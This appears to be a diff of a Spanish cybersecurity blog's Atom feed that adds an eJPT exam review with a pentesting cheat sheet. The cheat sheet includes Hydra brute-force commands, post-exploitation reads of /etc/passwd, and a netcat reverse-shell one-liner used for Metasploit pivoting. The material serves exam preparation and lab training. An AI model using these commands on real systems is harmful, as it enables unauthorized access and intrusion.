@@ -1,4 +1,382 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-01-04T10:48:08-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pwn3t | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad y CTFs</subtitle><author><name>Kysk3</name></author><entry><title type="html">Timing - HackTheBox</title><link href="http://localhost:4000/timing/" rel="alternate" type="text/html" title="Timing - HackTheBox" /><published>2025-12-20T00:00:00-05:00</published><updated>2025-12-20T00:00:00-05:00</updated><id>http://localhost:4000/timing</id><content type="html" xml:base="http://localhost:4000/timing/"><![CDATA[<p align="center">
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2026-03-02T17:53:48-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Pwn3t | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad y CTFs</subtitle><author><name>Kyzk3</name></author><entry><title type="html">eJPT Review 2026</title><link href="http://localhost:4000/eJPT/" rel="alternate" type="text/html" title="eJPT Review 2026" /><published>2026-03-02T00:00:00-05:00</published><updated>2026-03-02T00:00:00-05:00</updated><id>http://localhost:4000/eJPT</id><content type="html" xml:base="http://localhost:4000/eJPT/"><![CDATA[<p align="center">
+<img src="/assets/certs/Cert-eJPT.png" />
+</p>
+
+<h2 id="cómo-es-el-examen">¿Cómo es el examen?</h2>
+
+<p>El eJPT es un examen práctico compuesto por 35 preguntas tipo test que deben resolverse en un plazo de 48 horas. Se desarrolla desde una máquina Kali Linux accesible mediante el navegador a través de Guacamole; esta máquina no tiene acceso a internet, aunque realmente no es necesario para completarlo. El laboratorio incluye más de cinco hosts, algunos de ellos ubicados en una red interna, por lo que será necesario realizar pivoting para alcanzarlos. En este punto, recomiendo utilizar Metasploit, ya que facilita considerablemente el proceso de movimiento lateral dentro del entorno del examen.</p>
+
+<h2 id="motivo-de-sacarme-el-examen">Motivo de sacarme el examen</h2>
+
+<p>Decidí rendir el eJPT principalmente para poner a prueba mi nivel real. Antes de presentarlo, ya había resuelto más de 90 máquinas en Hack The Box; sin embargo, aún sentía que mi nivel estaba por debajo de alguien que contara con esta certificación. Por ello, mi objetivo no era solo obtener el certificado, sino medir de manera objetiva mis conocimientos y mi metodología.
+Después de completar el examen, entendí que mi nivel no era tan bajo como pensaba. Más que una validación externa, el eJPT terminó siendo una validación personal sobre mis fundamentos técnicos.</p>
+
+<h2 id="impresiones-del-examen">Impresiones del examen</h2>
+
+<p>Desarrollé el examen en aproximadamente 18 horas, distribuidas en distintos momentos, ya que hice pausas para comer y descansar. En esencia, el examen evalúa si tienes una metodología sólida al momento de realizar reconocimiento y enumeración. La mayoría de vulnerabilidades se descubren identificando correctamente qué servicios están corriendo, sus versiones, los puertos expuestos y las vulnerabilidades comunes asociadas. Además, es fundamental saber interactuar con servicios como FTP, SMB, SSH, HTTP o HTTPS y comprender qué información útil puede extraerse de cada uno.</p>
+
+<p>Uno de los aspectos que más me gustó fue la parte de pivoting, ya que me obligó a profundizar en el uso de Metasploit; anteriormente estaba más acostumbrado a realizar este proceso con Chisel. No obstante, en términos generales, el examen me pareció bastante orientado a estilo CTF, con vulnerabilidades muy evidentes y escenarios poco realistas si los comparamos con auditorías reales.</p>
+
+<p>Además, el examen abusa considerablemente del concepto de fuerza bruta, algo que, desde mi perspectiva, es poco realista debido al nivel de ruido que este tipo de ataques genera en entornos reales. También noté que en varias preguntas se ofrecen pistas bastante directas; por ejemplo, cuando se pregunta por la contraseña de un usuario específico y se proporcionan cuatro posibles opciones, ya se está validando indirectamente el usuario. Finalmente, me hubiera parecido más profesional poder utilizar mi propio entorno de trabajo y conectarme mediante VPN, en lugar de depender exclusivamente de una máquina accesible desde el navegador.</p>
+
+<h2 id="conocimientos-que-debes-dominar-antes-de-rendirlo">Conocimientos que debes dominar antes de rendirlo</h2>
+
+<p>Si quieres aprobar el eJPT con seguridad, no necesitas conocimientos avanzados, pero sí debes tener bases sólidas en networking, enumeración y explotación básica. El examen no premia la creatividad extrema, sino la correcta aplicación de fundamentos técnicos.</p>
+
+<h2 id="recursos-que-recomiendo-para-preparar-el-ejpt">Recursos que recomiendo para preparar el eJPT</h2>
+
+<p>Si estás pensando en rendir el eJPT, estos son los recursos que considero más útiles para llegar con una base sólida y una metodología clara.</p>
+
+<p><strong>Plataformas para practicar máquinas</strong></p>
+<ul>
+  <li>HackTheBox</li>
+  <li>Vulnhub</li>
+  <li>Dockerlabs</li>
+</ul>
+
+<p><strong>Metodología y enfoque realista</strong> <br />
+Si quieres entender cómo afrontar el examen desde una perspectiva más estructurada y cercana a un examen real, te recomiendo este video explicativo:
+<code class="language-plaintext highlighter-rouge">https://www.youtube.com/watch?v=v20IsEd5nUU</code></p>
+
+<p><strong>Roadmap de máquinas recomendadas</strong> <br />
+Para seguir una ruta más guiada y enfocada específicamente en el eJPT, puedes consultar:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">https://www.hackingvault.com/</code></li>
+  <li><code class="language-plaintext highlighter-rouge">https://docs.google.com/spreadsheets/u/0/d/1dzvaGlT_0xnT-PGO27Z_4prHgA8PHIpErmoWdlUrSoA/edit?usp=sharing&amp;pli=1&amp;authuser=0</code></li>
+</ul>
+
+<p><br /></p>
+
+<h1 id="cheat-sheet">Cheat Sheet</h1>
+
+<h2 id="networking-básico">Networking básico</h2>
+
+<p>Antes de hablar de explotación, debes entender qué estás atacando.</p>
+
+<p>Debes dominar:</p>
+
+<ul>
+  <li>
+    <p>Modelo TCP/IP</p>
+  </li>
+  <li>
+    <p>Puertos comunes</p>
+  </li>
+  <li>
+    <p>Subnetting básico</p>
+  </li>
+  <li>
+    <p>Comunicación cliente-servidor</p>
+  </li>
+  <li>
+    <p>Diferencia entre TCP y UDP</p>
+  </li>
+</ul>
+
+<p><strong>Comandos</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Ver interfaces de red</span>
+ip a
+
+<span class="c"># Comprobar conectividad</span>
+ping &lt;TARGET_IP&gt;
+
+<span class="c"># Descubrir hosts en red local</span>
+arp-scan <span class="nt">-I</span> ens33 <span class="nt">--localnet</span> <span class="nt">--ignoredups</span>
+
+<span class="c"># Conectarse manualmente a servicios</span>
+nc <span class="nt">-v</span> &lt;HOST&gt; &lt;PORT&gt;
+openssl s_client <span class="nt">-connect</span> &lt;HOST&gt;:&lt;PORT&gt;
+
+<span class="c"># Ver conexiones locales</span>
+netstat <span class="nt">-nat</span>
+ss <span class="nt">-nltp</span>
+</code></pre></div></div>
+
+<h2 id="enumeración-la-parte-más-importante">Enumeración (LA PARTE MÁS IMPORTANTE)</h2>
+
+<p>El examen se basa principalmente en enumerar correctamente. Si no sabes enumerar, no avanzas.</p>
+
+<p><strong>Nmap</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Escaneo completo TCP</span>
+nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 3000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> &lt;TARGET_IP&gt; <span class="nt">-oG</span> allPorts
+
+<span class="c"># Escaneo UDP</span>
+nmap <span class="nt">-p-</span> <span class="nt">-sU</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-vvv</span> <span class="nt">-n</span> &lt;TARGET_IP&gt; <span class="nt">-oN</span> udp_allPorts
+
+<span class="c"># Escaneo detallado de puertos específicos</span>
+nmap <span class="nt">-p22</span>,80,443 <span class="nt">-sCV</span> &lt;TARGET_IP&gt; <span class="nt">-oN</span> targeted
+</code></pre></div></div>
+
+<p><strong>SMB</strong>
+Enumeración sin credenciales y con credenciales.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># CrackMapExec</span>
+crackmapexec smb &lt;TARGET_IP&gt;
+crackmapexec smb &lt;TARGET_IP&gt; <span class="nt">--shares</span>
+crackmapexec smb &lt;TARGET_IP&gt; <span class="nt">-u</span> usuario <span class="nt">-p</span> password <span class="nt">--shares</span>
+crackmapexec smb &lt;TARGET_IP&gt; <span class="nt">-u</span> usuario <span class="nt">-p</span> password <span class="nt">--users</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbclient</span>
+smbclient <span class="nt">-L</span> //&lt;TARGET_IP&gt; <span class="nt">-N</span>
+smbclient <span class="nt">-L</span> //&lt;TARGET_IP&gt; <span class="nt">-U</span> usuario
+smbclient //&lt;TARGET_IP&gt;/share <span class="nt">-U</span> usuario
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># smbmap</span>
+smbmap <span class="nt">-H</span> &lt;TARGET_IP&gt;
+smbmap <span class="nt">-H</span> &lt;TARGET_IP&gt; <span class="nt">-u</span> usuario <span class="nt">-p</span> password
+smbmap <span class="nt">-H</span> &lt;TARGET_IP&gt; <span class="nt">-u</span> usuario <span class="nt">-p</span> password <span class="nt">-r</span>
+</code></pre></div></div>
+
+<p><strong>FTP</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp &lt;TARGET_IP&gt;
+<span class="c"># usuario: anonymous</span>
+
+<span class="nb">ls
+cd</span> /../..
+get &lt;file&gt;
+put &lt;file&gt;
+</code></pre></div></div>
+<p><strong>Web</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb &lt;TARGET_IP&gt;
+
+wget &lt;TARGET_IP&gt;
+curl &lt;TARGET_IP&gt;
+curl <span class="nt">-I</span> http://&lt;TARGET_IP&gt;/&lt;DIR&gt;
+</code></pre></div></div>
+
+<p><strong>SMTP</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;TARGET_IP&gt; 25
+telnet &lt;TARGET_IP&gt; 25
+
+smtp-user-enum <span class="nt">-U</span> users.txt <span class="nt">-t</span> &lt;TARGET_IP&gt;
+</code></pre></div></div>
+
+<p><strong>MySQL</strong></p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mysql</span> <span class="o">-</span><span class="n">h</span> <span class="o">&lt;</span><span class="n">TARGET_IP</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">u</span> <span class="n">root</span> <span class="o">-</span><span class="n">p</span>
+
+<span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
+<span class="n">use</span> <span class="o">&lt;</span><span class="n">DB_NAME</span><span class="o">&gt;</span><span class="p">;</span>
+<span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="o">&lt;</span><span class="k">TABLE</span><span class="o">&gt;</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="windows">Windows</h2>
+
+<p><strong>RDP</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xfreerdp /u:&lt;USER&gt; /p:&lt;PW&gt; /v:&lt;TARGET_IP&gt;
+</code></pre></div></div>
+
+<p><strong>WinRM</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> &lt;IP&gt; <span class="nt">-u</span> &lt;USER&gt; <span class="nt">-p</span> &lt;PASSWORD&gt;
+
+crackmapexec winrm &lt;TARGET_IP&gt; <span class="nt">-u</span> &lt;USER&gt; <span class="nt">-p</span> &lt;PW&gt; <span class="nt">-x</span> <span class="s2">"whoami"</span>
+</code></pre></div></div>
+
+<p><strong>IIS WebDAV</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>davtest <span class="nt">-url</span> &lt;URL&gt;
+cadaver &lt;URL&gt;
+</code></pre></div></div>
+
+<h2 id="ataques-básicos">Ataques básicos</h2>
+
+<p>Aquí no necesitas exploits complejos, pero sí dominar:</p>
+
+<ul>
+  <li>Fuerza bruta</li>
+  <li>SQL Injection básica</li>
+  <li>File Inclusion básica</li>
+  <li>Uso básico de Metasploit</li>
+</ul>
+
+<p><strong>Hydra (muy importante para el examen)</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># SMB</span>
+hydra <span class="nt">-l</span> admin <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt &lt;TARGET_IP&gt; smb
+
+<span class="c"># FTP</span>
+hydra <span class="nt">-L</span> users.txt <span class="nt">-P</span> passwords.txt &lt;TARGET_IP&gt; ftp
+
+<span class="c"># SSH</span>
+hydra <span class="nt">-l</span> user <span class="nt">-P</span> rockyou.txt &lt;TARGET_IP&gt; ssh
+
+<span class="c"># HTTP POST</span>
+hydra <span class="nt">-l</span> admin <span class="nt">-P</span> rockyou.txt example.com https-post-form <span class="s2">"/login.php:username=^USER^&amp;password=^PASS^:Invalid"</span>
+</code></pre></div></div>
+
+<h2 id="metodología-lo-que-realmente-evalúan">Metodología (lo que realmente evalúan)</h2>
+
+<p>Más importante que saber comandos es:</p>
+
+<ul>
+  <li>Documentar todo lo que encuentras</li>
+  <li>No saltarte pasos</li>
+  <li>Enumerar antes de explotar</li>
+  <li>Validar credenciales en todos los servicios</li>
+  <li>Probar reutilización de contraseñas</li>
+  <li>Revisar permisos una vez dentro</li>
+</ul>
+
+<h2 id="post-explotación-básica-linux">Post-explotación básica Linux</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">id
+sudo</span> <span class="nt">-l</span>
+<span class="nb">cat</span> /etc/passwd 
+find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
+crontab <span class="nt">-l</span>
+ps <span class="nt">-faux</span>
+netstat <span class="nt">-nat</span> 
+ss <span class="nt">-nltp</span>
+</code></pre></div></div>
+
+<h2 id="pivoting-con-metasploit">Pivoting con Metasploit</h2>
+
+<p><strong>Descubrimiento de hosts (Bash)</strong></p>
+
+<p>Script para identificar hosts activos en la red interna:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">function </span>ctrl_c<span class="o">(){</span>
+  <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">[!] Saliendo..."</span>
+  tput cnorm<span class="p">;</span> <span class="nb">exit </span>1
+<span class="o">}</span>
+
+tput civis
+<span class="nb">trap </span>ctrl_c SIGINT
+
+<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 254<span class="si">)</span><span class="p">;</span> <span class="k">do
+  </span><span class="nb">timeout </span>1 bash <span class="nt">-c</span> <span class="s2">"ping -c 1 -W 1 192.168.18.</span><span class="nv">$i</span><span class="s2"> &amp;&gt;/dev/null &amp;&amp; echo '[+] Host activo: 192.168.18.</span><span class="nv">$i</span><span class="s2">'"</span> &amp;
+<span class="k">done
+
+</span><span class="nb">wait
+</span>tput cnorm
+</code></pre></div></div>
+
+<p><strong>Requisitos para Pivoting</strong></p>
+
+<ul>
+  <li>Tener acceso a la <strong>máquina víctima</strong></li>
+  <li>Contar con una <strong>shell tipo Meterpreter</strong></li>
+  <li>Metasploit Framework operativo en la máquina atacante</li>
+</ul>
+
+<p><strong>Listener en Metasploit</strong></p>
+
+<p>Nos ponemos en escucha para recibir la shell reversa:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+
+use multi/handler
+<span class="nb">set </span>LHOST &lt;tu-ip&gt;
+<span class="nb">set </span>LPORT &lt;tu-puerto&gt;
+run
+</code></pre></div></div>
+<blockquote>
+  <p>El payload se deja por defecto en <code class="language-plaintext highlighter-rouge">shell_reverse_tcp</code></p>
+</blockquote>
+
+<p><strong>En la máquina víctima</strong></p>
+
+<p>Enviar una shell reversa al listener:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc 10.0.2.100 443 <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+
+<p>Una vez recibida:</p>
+<ul>
+  <li>Mandar la shell al <strong>background</strong> con <code class="language-plaintext highlighter-rouge">Ctrl + Z</code></li>
+  <li>Verificar la sesión creada:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions
+</code></pre></div></div>
+
+<p><strong>Upgradear shell a Meterpreter</strong></p>
+
+<p>Convertimos la shell normal en una sesión Meterpreter:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">shell_to_meterpreter</span>
+<span class="nb">set</span> <span class="n">LHOST</span> <span class="mf">10.0</span><span class="p">.</span><span class="mf">2.100</span>
+<span class="nb">set</span> <span class="n">LPORT</span> <span class="mi">443</span>
+<span class="nb">set</span> <span class="n">SESSION</span> <span class="mi">1</span>     <span class="c1"># el 1 es el ID de la session con la shell tcp
+</span><span class="n">run</span>
+
+<span class="c1">#Esto creará una nueva sesión Meterpreter
+</span><span class="n">sessions</span> <span class="o">-</span><span class="n">i</span> <span class="mi">2</span>
+</code></pre></div></div>
+
+<h2 id="pivoting--enrutamiento-routing">Pivoting – Enrutamiento (Routing)</h2>
+
+<p><br /></p>
+
+<p><strong>Añadir ruta manualmente</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>route add 192.168.100.0/24 2
+</code></pre></div></div>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">192.168.100.0/24</code> → Red objetivo</li>
+  <li><code class="language-plaintext highlighter-rouge">2</code> → ID de la sesión Meterpreter</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Listar rutas</span>
+route
+
+<span class="c">#Eliminar ruta</span>
+route del 192.168.100.0/24 2
+</code></pre></div></div>
+<h3 id="autoroute-automático">Autoroute (Automático)</h3>
+
+<p>Añadir rutas automáticamente desde la sesión Meterpreter:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">multi</span><span class="o">/</span><span class="n">manage</span><span class="o">/</span><span class="n">autoroute</span>
+<span class="nb">set</span> <span class="n">SESSION</span> <span class="mi">2</span>
+<span class="n">run</span>
+
+<span class="c1">#Verificar
+</span><span class="n">route</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<p><strong>Escaneo de puertos vía Pivoting</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">portscan</span><span class="o">/</span><span class="n">tcp</span>
+<span class="nb">set</span> <span class="n">RHOSTS</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">100.21</span>
+<span class="n">run</span>
+</code></pre></div></div>
+<p><br /></p>
+
+<p><strong>Port Forwarding con Meterpreter</strong></p>
+
+<p>Conectarse a la sesión Meterpreter:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-i</span> 2
+</code></pre></div></div>
+
+<p>Crear redirección de Puertos</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>portfwd add <span class="nt">-l</span> 8080 <span class="nt">-p</span> 80 <span class="nt">-r</span> 192.168.100.21
+</code></pre></div></div>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-l</code> puerto local</li>
+  <li><code class="language-plaintext highlighter-rouge">-p</code> puerto remoto</li>
+  <li><code class="language-plaintext highlighter-rouge">-r</code> host remoto</li>
+</ul>
+
+<p>Listar redirecciones</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>portfwd
+</code></pre></div></div>
+
+<p>Acceso desde el navegador</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8080</span>
+</code></pre></div></div>
+<blockquote>
+  <p>Permite acceder al <strong>puerto 80</strong> de la máquina interna <code class="language-plaintext highlighter-rouge">192.168.100.21</code></p>
+</blockquote>]]></content><author><name>Kyzk3</name></author><category term="Certificaciones" /><category term="eJPTv2" /><category term="Review" /><summary type="html"><![CDATA[Este artículo analiza el examen eJPT, explicando su estructura, nivel real de dificultad y los conocimientos necesarios para aprobarlo, junto con mi experiencia y recursos recomendados para prepararte.]]></summary></entry><entry><title type="html">Timing - HackTheBox</title><link href="http://localhost:4000/timing/" rel="alternate" type="text/html" title="Timing - HackTheBox" /><published>2025-12-20T00:00:00-05:00</published><updated>2025-12-20T00:00:00-05:00</updated><id>http://localhost:4000/timing</id><content type="html" xml:base="http://localhost:4000/timing/"><![CDATA[<p align="center">
 <img src="/assets/images/HackTheBox/Timing/timing_htb.png" />
 </p>
 
@@ -466,7 +844,7 @@ aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
 </code></pre></div></div>
 
 <h2 id="ejecución-del-autopwn">Ejecución del AutoPwn</h2>
-<p><br /></p>]]></content><author><name>Kysk3</name></author><category term="HackTheBox" /><category term="Autopwn" /><category term="Scripting" /><category term="Code Inspection" /><category term="Abusing Sudoers Privilege" /><summary type="html"><![CDATA[La máquina Timing es ideal para practicar la interpretación de código. La resolución de la máquina consiste en explotar malas configuraciones en la aplicación web.]]></summary></entry><entry><title type="html">Montaje del lab eJPT</title><link href="http://localhost:4000/montaje_eJPt/" rel="alternate" type="text/html" title="Montaje del lab eJPT" /><published>2025-11-26T00:00:00-05:00</published><updated>2025-11-26T00:00:00-05:00</updated><id>http://localhost:4000/montaje_eJPt</id><content type="html" xml:base="http://localhost:4000/montaje_eJPt/"><![CDATA[<p align="center">
+<p><br /></p>]]></content><author><name>Kyzk3</name></author><category term="HackTheBox" /><category term="Autopwn" /><category term="Scripting" /><category term="Code Inspection" /><category term="Abusing Sudoers Privilege" /><summary type="html"><![CDATA[La máquina Timing es ideal para practicar la interpretación de código. La resolución de la máquina consiste en explotar malas configuraciones en la aplicación web.]]></summary></entry><entry><title type="html">Montaje del lab eJPT</title><link href="http://localhost:4000/montaje_eJPt/" rel="alternate" type="text/html" title="Montaje del lab eJPT" /><published>2025-11-26T00:00:00-05:00</published><updated>2025-11-26T00:00:00-05:00</updated><id>http://localhost:4000/montaje_eJPt</id><content type="html" xml:base="http://localhost:4000/montaje_eJPt/"><![CDATA[<p align="center">
 <img src="/assets/images/eJPT/Arquitectura.png" />
 </p>
 
@@ -554,7 +932,7 @@ aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
   <li>Venom 1 – Runas – Durian 1</li>
 </ul>
 
-<p><img src="/assets/images/eJPT/Montaje/Durian_1_Red.png" alt="" /></p>]]></content><author><name>Kysk3</name></author><category term="Certificaciones" /><category term="Diseño de Entorno" /><category term="eJPTv2" /><category term="Pentesting Básico" /><category term="Pivoting" /><category term="Laboratorio de Pentesting" /><category term="Redes y Subredes" /><summary type="html"><![CDATA[Creación de un laboratorio inspirado en el eJPT, compuesto por dos subredes y seis máquinas virtuales (dos Windows y cuatro Linux), diseñado para cubrir todos los contenidos esenciales de la certificación.]]></summary></entry><entry><title type="html">Presidential 1 - VulnHub</title><link href="http://localhost:4000/presidential/" rel="alternate" type="text/html" title="Presidential 1 - VulnHub" /><published>2025-11-12T00:00:00-05:00</published><updated>2025-11-12T00:00:00-05:00</updated><id>http://localhost:4000/presidential</id><content type="html" xml:base="http://localhost:4000/presidential/"><![CDATA[<p align="center">
+<p><img src="/assets/images/eJPT/Montaje/Durian_1_Red.png" alt="" /></p>]]></content><author><name>Kyzk3</name></author><category term="Certificaciones" /><category term="Diseño de Entorno" /><category term="eJPTv2" /><category term="Pentesting Básico" /><category term="Pivoting" /><category term="Laboratorio de Pentesting" /><category term="Redes y Subredes" /><summary type="html"><![CDATA[Creación de un laboratorio inspirado en el eJPT, compuesto por dos subredes y seis máquinas virtuales (dos Windows y cuatro Linux), diseñado para cubrir todos los contenidos esenciales de la certificación.]]></summary></entry><entry><title type="html">Presidential 1 - VulnHub</title><link href="http://localhost:4000/presidential/" rel="alternate" type="text/html" title="Presidential 1 - VulnHub" /><published>2025-11-12T00:00:00-05:00</published><updated>2025-11-12T00:00:00-05:00</updated><id>http://localhost:4000/presidential</id><content type="html" xml:base="http://localhost:4000/presidential/"><![CDATA[<p align="center">
 <img src="/assets/images/vulnHub/presidential_1/casablanca.jpg" />
 </p>
 
@@ -896,4 +1274,4 @@ En este caso como tiene habilitado el SSH nos intereza obtener la <code class="l
 
 <h2 id="ejecución-del-autopwn">Ejecución del AutoPwn</h2>
 <p><br />
-<img src="/assets/images/vulnHub/presidential_1/AutoPwn.png" alt="" /></p>]]></content><author><name>Kysk3</name></author><category term="VulnHub" /><category term="Autopwn" /><category term="Scripting" /><category term="Web Enumeration" /><category term="Information Leakage" /><category term="Virtual Hosting" /><category term="Abusing phpMyAdmin" /><category term="Pentesting" /><category term="Abusing Capabilities" /><summary type="html"><![CDATA[Presidential es una máquina ideal para empezar: toca cosas básicas de pentesting y te obliga a practicar la enumeración web.]]></summary></entry></feed>
+<img src="/assets/images/vulnHub/presidential_1/AutoPwn.png" alt="" /></p>]]></content><author><name>Kyzk3</name></author><category term="VulnHub" /><category term="Autopwn" /><category term="Scripting" /><category term="Web Enumeration" /><category term="Information Leakage" /><category term="Virtual Hosting" /><category term="Abusing phpMyAdmin" /><category term="Pentesting" /><category term="Abusing Capabilities" /><summary type="html"><![CDATA[Presidential es una máquina ideal para empezar: toca cosas básicas de pentesting y te obliga a practicar la enumeración web.]]></summary></entry></feed>
